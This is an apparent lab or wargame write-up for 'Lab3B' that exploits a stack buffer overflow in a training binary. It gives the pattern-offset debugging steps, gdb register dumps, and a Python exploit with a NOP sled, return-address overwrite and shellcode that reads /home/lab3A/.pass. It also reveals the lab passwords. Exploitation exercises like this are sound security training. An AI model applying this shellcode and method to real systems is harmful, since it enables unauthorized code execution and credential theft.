## Lab3B

`th3r3_iz_n0_4dm1ns_0n1y_U!`

By reading the source we know that we need to read the .pass file directly using shellcode without spawning a shell.

To generate pattern - `https://github.com/Svenito/exploit-pattern`

`python -c "print 'x'*128 + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A'" > /tmp/patt`

```
gdb-peda$ r < /tmp/patt
Starting program: /levels/lab03/lab3B < /tmp/patt
[New process 1165]
just give me some shellcode, k
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.19.so...done.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1165]
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x61413561 ('a5Aa')
ECX: 0xfbad2088 
EDX: 0xb7fce8a4 --> 0x0 
ESI: 0x0 
EDI: 0x37614136 ('6Aa7')
EBP: 0x41386141 ('Aa8A')
ESP: 0xbffff700 ("0Ab1Ab2A")
EIP: 0x62413961 ('a9Ab')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x62413961
[------------------------------------stack-------------------------------------]
0000| 0xbffff700 ("0Ab1Ab2A")
0004| 0xbffff704 ("Ab2A")
0008| 0xbffff708 --> 0xbffff700 ("0Ab1Ab2A")
0012| 0xbffff70c --> 0xb7feccea (<call_init+26>:        add    ebx,0x12316)
0016| 0xbffff710 --> 0x1 
0020| 0xbffff714 --> 0xbffff794 --> 0xbffff8b8 ("/levels/lab03/lab3B")
0024| 0xbffff718 --> 0xbffff734 --> 0x6fef40d9 
0028| 0xbffff71c --> 0x8049e80 --> 0xb7e3c990 (<__libc_start_main>:     push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x62413961 in ?? ()
```

```
python pattern.py 0x62413961
Pattern 0x62413961 first occurrence at position 28 in pattern.
```

Therefore, offset = 128 + 28= 156

```
gdb-peda$ x/s 0xbffff700-(128+28+4)
0xbffff660:     'x' <repeats 128 times>, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A"
```
Our shellcode is at `0xbffff660`

```
import struct

# http://shell-storm.org/shellcode/files/shellcode-73.php
shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd" 
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd" 
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0" 
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
"\xff"
"/home/lab3A/.pass\x00")

eip = struct.pack("<I", 0xbffff640)
exploit = '\x90'*(128-len(shellcode)) + shellcode + '\x90'*28 + eip
print exploit
```

Address of input is different when running with and without gdb

```
$ python /tmp/lab3b.py | ./lab3B
just give me some shellcode, k
wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
child is exiting...
```
password - **`wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd`**